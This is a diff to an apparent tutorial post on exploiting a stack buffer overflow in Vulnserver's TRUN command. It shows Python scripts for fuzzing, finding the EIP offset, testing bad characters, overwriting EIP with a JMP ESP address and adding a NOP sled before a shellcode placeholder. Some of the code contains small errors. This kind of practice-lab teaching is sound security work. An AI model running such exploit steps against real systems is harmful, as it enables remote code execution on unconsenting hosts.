@@ -98,14 +98,14 @@ from time import sleep
 buffer = A * 100  
 while True:  
     try:  
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
-        s.connect(('192.168.x.x,9999'))  
-        s.send(('TRUN /.:/ ' + buffer)) // Added the .: just because we saw that it runs when we send TRUN before the chars begin.  
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # create socket connection  
+        s.connect(('192.168.x.x,9999'))  # point the socket connection to vulnserver  
+        s.send(('TRUN /.:/ ' + buffer)) # Added the .: just because we saw that it runs when we send TRUN before the chars begin.  
         s.close()  
         sleep(1)
-        buffer = buffer + “A”*100 // If 100 wasn't enough, let's grow exponentially  
+        buffer = buffer + “A”*100 # If 100 wasn't enough, let's grow exponentially  
     except:  
-        print “Fuzzing crashed at %s bytes” % str(len(buffer)) // (len(var)) will run funct Length on variable Buffer and should tell us the position that broke things.    
+        print “Fuzzing crashed at %s bytes” % str(len(buffer)) # (len(var)) will run funct Length on variable Buffer and should tell us the position that broke things.    
         sys.exit()  
 {% endhighlight %}</p>
 <hr>
@@ -123,7 +123,7 @@ So about 3000 will crash out of the buffer, I guess more will get us to EIP.</p>
 Tool in MSF is pattern_create<br>
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 // -l is Length<br>
 Hit enter<br>
-It generates a crazy cyclical code that will have to be sent into server</p>
+It generates a crazy cyclical code that will have to be sent into server.  We will later come back and feed a new value back to the tool to find the offset, because maths.  </p>
 <hr>
 <p class="has-line-data" data-line-start="124" data-line-end="138">New demo script, named <a href="http://2.py">2.py</a>:<br>
 {% highlight ruby %}<br>
@@ -133,11 +133,11 @@ offset = "<paste code here>
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
-    s.send(('TRUN /.:/ ' + offset)) // send the value  
+    s.send(('TRUN /.:/ ' + offset)) # send the value  
     s.close()  
 except:  
     print “Error connecting to server”  
-    sys.exit() // then close the connection, we'll use tool to find offset based on char pattern  
+    sys.exit() # then close the connection, we'll use tool to find offset based on char pattern  
 {% endhighlight %}</p>
 <hr>
 <p class="has-line-data" data-line-start="139" data-line-end="151">chmod +x <a href="http://2.py">2.py</a><br>
@@ -157,7 +157,7 @@ Interesting, that is a small chunk of code to fit a shell or new pointer in.</p>
 {% highlight ruby %}<br>
 #!/usr/bin/python  
 import sys, socket  
-shellcode = “A”*2003 + “B” * 4 // offset filler up to EIP, then 4 B's within EIP  
+shellcode = “A”*2003 + “B” * 4 # offset filler up to EIP, then 4 B's within EIP to check our work
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
@@ -190,7 +190,7 @@ import sys, socket
 badChars = (  
 "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  
 )  
-shellcode = “A”*2003 + badChars // offset filler up to EIP, then badChars in EIP  
+shellcode = “A”*2003 + badChars # offset filler up to EIP, then badChars in EIP  
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
@@ -251,7 +251,7 @@ edit the <a href="http://2.py">2.py</a> script as:<br>
 {% highlight ruby %}<br>
 #!/usr/bin/python  
 import sys, socket  
-shellcode = “A”*2003 + “\xaf\x11\x50\x62” // ← this is the 625011af first pointer in first column from the !mona find results above (litte endian because binary is 32-bit x86)  
+shellcode = “A”*2003 + “\xaf\x11\x50\x62” # ← this is the 625011af first pointer in first column from the !mona find results above (litte endian because binary is 32-bit x86 so the nibbles go in reverse order)  
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
@@ -284,8 +284,7 @@ Edit <a href="http://2.py">2.py</a> as:<br>
 import sys, socket  
 overflow = (  
 "paste the actual payload hex here")  
-shellcode = “A”*2003 + “\xaf\x11\x50\x62” + “\x90” + 32 + overflow
-// “\x90” + 32 is a NOPslide, it's padding to get us past any other NOP calls before calling the payload.    
+shellcode = “A”*2003 + “\xaf\x11\x50\x62” + “\x90” + 32 + overflow # “\x90” + 32 is a NOPslide, it's padding to get us past any other NOP calls before calling the payload.    
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
